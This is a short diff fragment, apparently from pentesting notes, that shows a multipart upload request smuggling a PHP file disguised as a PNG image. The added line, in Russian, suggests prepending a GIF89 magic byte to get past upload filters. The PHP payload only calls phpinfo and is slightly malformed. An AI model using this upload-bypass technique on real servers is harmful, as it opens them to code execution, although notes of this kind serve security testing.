@@ -34,3 +34,6 @@ Content-Disposition: form-data; name="upload"; filename="php_info.php"
 Content-Type: image/png
 
 <? php_phpinfo(); ?>
+
+
+так же можно добавить magick byte формата в начало файла например GIF89
